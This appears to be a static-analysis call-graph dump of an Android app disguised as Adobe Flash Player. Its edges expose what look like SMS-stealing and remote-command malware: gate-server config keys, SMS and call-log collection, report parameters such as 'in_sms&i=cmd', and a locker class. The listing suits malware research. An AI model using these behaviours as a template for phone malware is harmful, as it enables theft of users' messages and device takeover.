SPECIAL edge: specialinvoke r0.<android.app.Activity: void onDestroy()>() in <com.adobe.flashplayer_.FlashARM: void onDestroy()> ==> <android.app.Activity: void onDestroy()>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void onDestroy()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r8) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=doubled_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("_", " ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r6.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_good&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<android.os.AsyncTask: void <init>()>() in <com.adobe.flashplayer_.FlashVars: void <init>()> ==> <android.os.AsyncTask: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r59.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r7, "OFF") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: void setContentView(int)>(2130903041) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Title: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <android.content.ComponentName: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.content.ComponentName: void <clinit>()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "getMessages:SMSGATE", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_SMSGate", r8, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", r25, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r3.<java.io.File: java.lang.String getPath()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String getPath()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)>
STATIC edge: $r15 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_sms&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.String: boolean contains(java.lang.CharSequence)>("A") in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.packages.ZLocker: void <init>()> ==> <android.app.Activity: java.lang.Object getSystemService(java.lang.String)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <android.os.Environment: java.lang.String getExternalStorageState()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.Environment: java.lang.String getExternalStorageState()>
STATIC edge: $r15 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>(r8, 0) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r2 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.Prefs: void stopSelf()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void stopSelf()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
STATIC edge: r30 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r11 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r3.<java.io.File: boolean canRead()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: boolean canRead()>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ Sent Messages ] \r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "calls.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("EST:") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.View findViewById(int)>(2131296256) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.View findViewById(int)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("remoteSD") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: $r11 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r10) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)>(r0, 15000L, 3000L) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
